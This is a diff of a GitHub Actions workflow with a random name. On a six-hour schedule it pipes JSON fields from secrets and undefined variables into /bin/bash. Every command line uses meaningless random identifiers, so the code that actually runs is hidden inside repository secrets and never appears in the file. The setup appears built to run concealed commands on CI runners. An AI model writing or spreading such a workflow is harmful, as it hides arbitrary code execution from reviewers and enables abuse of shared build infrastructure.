@@ -1,25 +1,26 @@
 name: faultexuberant
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
+    - cron: '36 0/6 * * *'
 
-jobs:  # 15838
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: faultexuberant
         env:
-          qf0: ${{ secrets.qf0 }}
+          c069: ${{ secrets.c069 }}
         run: |
-          echo $qf0 | jq -r .eum170 | /bin/bash
-          echo $mpx4078 | jq -r .oqp3216 | /bin/bash
-          echo $wd59 | jq -r .x1 | /bin/bash
-          echo $z24 | jq -r .vye16606 | /bin/bash
-          echo $ah5 | jq -r .x2 | /bin/bash
-          echo $ievvt1 | jq -r .tfsb56 | /bin/bash
-          echo $dnj49 | jq -r .gzo0953 | /bin/bash
-          echo $s2 | jq -r .tta7308 | /bin/bash
-          echo $r4451 | jq -r .zb98184 | /bin/bash
+          echo $c069 | jq -r .y59 | /bin/bash
+          echo $rezmz8710 | jq -r .yh0 | /bin/bash
+          echo $ctwi5400 | jq -r .adt4 | /bin/bash
+          echo $kyuf342 | jq -r .ahy5426 | /bin/bash
+          echo $id4319 | jq -r .luxa54 | /bin/bash
+          echo $rc3 | jq -r .nhtl17749 | /bin/bash
+          echo $auola786 | jq -r .qo52566 | /bin/bash
+          echo $tlajq35915 | jq -r .pb8 | /bin/bash
 
